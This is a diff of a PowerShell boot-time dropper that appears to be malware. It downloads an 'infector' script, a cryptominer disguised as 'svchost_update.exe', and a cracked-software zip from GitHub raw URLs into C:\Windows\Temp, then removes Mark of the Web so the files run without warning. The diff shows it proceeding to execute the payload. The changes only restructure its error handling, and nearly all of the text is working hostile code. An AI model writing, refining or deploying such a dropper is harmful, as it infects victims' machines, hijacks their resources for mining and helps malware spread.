@@ -2,8 +2,8 @@ Start-Sleep -Seconds 15
 
 $logPath = "C:\Windows\Temp\boot_execution_log.txt"
 $logDirectory = Split-Path -Path $logPath -Parent
+$infectorScriptPath = "C:\Windows\Temp\infect.ps1"
 $infectorUrl = "https://github.com/NaomiMendoza127/USB/raw/refs/heads/main/infector.ps1"
-$infectorScriptPath = "C:\Windows\Temp\infector.ps1"
 $payloadUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/test.exe"
 $payloadPath = "C:\Windows\Temp\svchost_update.exe"
 $crackedSoftwareZipUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/SystemCore.zip"
@@ -32,35 +32,34 @@ if (Is-Admin) {
 
 # Consolidated download logic for all payloads
 Add-Content -Path $logPath -Value "[$(Get-Date)] Starting download checks for all payloads..."
-try {
-    # Ensure parent directory exists
-    if (-not (Test-Path -Path (Split-Path -Path $logPath -Parent))) {
-        New-Item -ItemType Directory -Path (Split-Path -Path $logPath -Parent) -Force | Out-Null
-        Add-Content -Path $logPath -Value "[$(Get-Date)] Created parent directory: $(Split-Path -Path $logPath -Parent)"
-    }
 
-    # Download infector.ps1 if it doesn't exist
-    if (-not (Test-Path -Path $infectorScriptPath)) {
-        Add-Content -Path $logPath -Value "[$(Get-Date)] infector.ps1 not found at $infectorScriptPath. Downloading from $infectorUrl..."
+# Download infector.ps1 if it doesn't exist
+if (-not (Test-Path -Path $infectorScriptPath)) {
+    try {
+        Add-Content -Path $logPath -Value "[$(Get-Date)] infect.ps1 not found at $infectorScriptPath. Downloading from $infectorUrl..."
         $infectorResponse = Invoke-WebRequest -Uri $infectorUrl -OutFile $infectorScriptPath -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop
-        Add-Content -Path $logPath -Value "[$(Get-Date)] infector.ps1 downloaded to $infectorScriptPath. Content-Type: $($infectorResponse.Headers['Content-Type'])"
+        Add-Content -Path $logPath -Value "[$(Get-Date)] infect.ps1 downloaded to $infectorScriptPath."
         if (-not (Test-Path -Path $infectorScriptPath)) {
-            throw "Downloaded infector.ps1 not found at $infectorScriptPath."
+            throw "Downloaded infect.ps1 not found at $infectorScriptPath."
         }
         if ([System.IO.Path]::GetExtension($infectorScriptPath).ToLower() -ne ".ps1") {
-            Add-Content -Path $logPath -Value "[$(Get-Date)] Warning: Downloaded infector.ps1 does not have .ps1 extension."
+            Add-Content -Path $logPath -Value "[$(Get-Date)] Warning: Downloaded infect.ps1 does not have .ps1 extension."
         }
         Unblock-File -Path $infectorScriptPath -ErrorAction Stop
         Add-Content -Path $logPath -Value "[$(Get-Date)] Removed Mark of the Web from $infectorScriptPath"
-    } else {
-        Add-Content -Path $logPath -Value "[$(Get-Date)] infector.ps1 already exists at $infectorScriptPath. Skipping download."
+    } catch {
+        Add-Content -Path $logPath -Value "[$(Get-Date)] Failed to download infect.ps1: $($_.Exception.Message)"
     }
+} else {
+    Add-Content -Path $logPath -Value "[$(Get-Date)] infect.ps1 already exists at $infectorScriptPath. Skipping download."
+}
 
-    # Download svchost_update.exe if it doesn't exist
-    if (-not (Test-Path -Path $payloadPath)) {
+# Download svchost_update.exe if it doesn't exist
+if (-not (Test-Path -Path $payloadPath)) {
+    try {
         Add-Content -Path $logPath -Value "[$(Get-Date)] svchost_update.exe not found at $payloadPath. Downloading from $payloadUrl..."
-        $webResponse = Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing -TimeoutSec 60 -PassThru
-        Add-Content -Path $logPath -Value "[$(Get-Date)] EXE payload downloaded to $payloadPath. Content-Type: $($webResponse.Headers['Content-Type'])"
+        $webResponse = Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop
+        Add-Content -Path $logPath -Value "[$(Get-Date)] EXE payload downloaded to $payloadPath."
         if (-not (Test-Path -Path $payloadPath)) {
             throw "Downloaded file not found at $payloadPath."
         }
@@ -69,15 +68,19 @@ try {
         }
         Unblock-File -Path $payloadPath -ErrorAction Stop
         Add-Content -Path $logPath -Value "[$(Get-Date)] Removed Mark of the Web from $payloadPath."
-    } else {
-        Add-Content -Path $logPath -Value "[$(Get-Date)] svchost_update.exe already exists at $payloadPath. Skipping download."
+    } catch {
+        Add-Content -Path $logPath -Value "[$(Get-Date)] Failed to download svchost_update.exe: $($_.Exception.Message)"
     }
+} else {
+    Add-Content -Path $logPath -Value "[$(Get-Date)] svchost_update.exe already exists at $payloadPath. Skipping download."
+}
 
-    # Download and extract WindowsServices if it doesn't exist
-    if (-not (Test-Path -Path $crackedSoftwareFolder)) {
+# Download and extract WindowsServices if it doesn't exist
+if (-not (Test-Path -Path $crackedSoftwareFolder)) {
+    try {
         Add-Content -Path $logPath -Value "[$(Get-Date)] WindowsServices folder not found at $crackedSoftwareFolder. Downloading from $crackedSoftwareZipUrl..."
-        $zipResponse = Invoke-WebRequest -Uri $crackedSoftwareZipUrl -OutFile $crackedSoftwareZipPath -UseBasicParsing -TimeoutSec 60 -PassThru
-        Add-Content -Path $logPath -Value "[$(Get-Date)] Update package downloaded to $crackedSoftwareZipPath. Content-Type: $($zipResponse.Headers['Content-Type'])"
+        $zipResponse = Invoke-WebRequest -Uri $crackedSoftwareZipUrl -OutFile $crackedSoftwareZipPath -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop
+        Add-Content -Path $logPath -Value "[$(Get-Date)] Update package downloaded to $crackedSoftwareZipPath."
         if (-not (Test-Path -Path $crackedSoftwareZipPath)) {
             throw "Downloaded zip file not found at $crackedSoftwareZipPath."
         }
@@ -89,14 +92,14 @@ try {
         }
         Unblock-File -Path "$crackedSoftwareFolder\*" -ErrorAction Stop
         Add-Content -Path $logPath -Value "[$(Get-Date)] Removed Mark of the Web from files in $crackedSoftwareFolder."
-    } else {
-        Add-Content -Path $logPath -Value "[$(Get-Date)] WindowsServices folder already exists at $crackedSoftwareFolder."
-        if (-not (Test-Path -Path $crackedSoftwareExe)) {
-            Add-Content -Path $logPath -Value "[$(Get-Date)] Warning: ServiceHost.exe not found in $crackedSoftwareFolder\SystemCore."
-        }
+    } catch {
+        Add-Content -Path $logPath -Value "[$(Get-Date)] Failed to download or extract WindowsServices: $($_.Exception.Message)"
     }
-} catch {
-    Add-Content -Path $logPath -Value "[$(Get-Date)] Failed during download or extraction: $($_.Exception.Message)"
+} else {
+    Add-Content -Path $logPath -Value "[$(Get-Date)] WindowsServices folder already exists at $crackedSoftwareFolder."
+    if (-not (Test-Path -Path $crackedSoftwareExe)) {
+        Add-Content -Path $logPath -Value "[$(Get-Date)] Warning: ServiceHost.exe not found in $crackedSoftwareFolder\SystemCore."
+    }
 }
 
 # Execute svchost_update.exe if it exists
